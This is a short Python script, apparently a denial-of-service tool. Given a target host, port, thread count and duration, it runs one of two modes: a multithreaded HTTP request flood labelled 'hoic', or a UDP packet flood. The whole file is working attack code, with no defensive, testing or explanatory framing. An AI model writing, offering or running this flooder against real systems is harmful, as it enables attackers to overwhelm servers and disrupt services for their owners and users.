import argparse
import socket
import threading
import time

def hoic_http(host, port, threads, duration):
    end = time.time() + duration
    payloads = [
        "GET /?q=1 HTTP/1.1\r\nHost: {}\r\nUser-Agent: A\r\n\r\n".format(host),
        "GET /index.html HTTP/1.1\r\nHost: {}\r\nUser-Agent: B\r\n\r\n".format(host),
        "GET /?id=999 HTTP/1.1\r\nHost: {}\r\nUser-Agent: C\r\n\r\n".format(host),
    ]
    def worker():
        while time.time() < end:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.5)
                s.connect((host, port))
                s.send(payloads[int(time.time()) % len(payloads)].encode())
                s.close()
            except Exception:
                pass
    ts = [threading.Thread(target=worker, daemon=True) for _ in range(threads)]
    for t in ts: t.start()
    for t in ts: t.join()

def udp_flood(host, port, threads, duration):
    end = time.time() + duration
    data = b"A"*1024
    def worker():
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while time.time() < end:
            try:
                s.sendto(data, (host, port))
            except Exception:
                pass
    ts = [threading.Thread(target=worker, daemon=True) for _ in range(threads)]
    for t in ts: t.start()
    for t in ts: t.join()

def main():
    p = argparse.ArgumentParser()
    p.add_argument("--mode", choices=["hoic","udp"], required=True)
    p.add_argument("--host", required=True)
    p.add_argument("--port", type=int, required=True)
    p.add_argument("--threads", type=int, default=50)
    p.add_argument("--duration", type=int, default=30)
    args = p.parse_args()
    if args.mode == "hoic":
        hoic_http(args.host, args.port, args.threads, args.duration)
    elif args.mode == "udp":
        udp_flood(args.host, args.port, args.threads, args.duration)

if __name__ == "__main__":
    main()
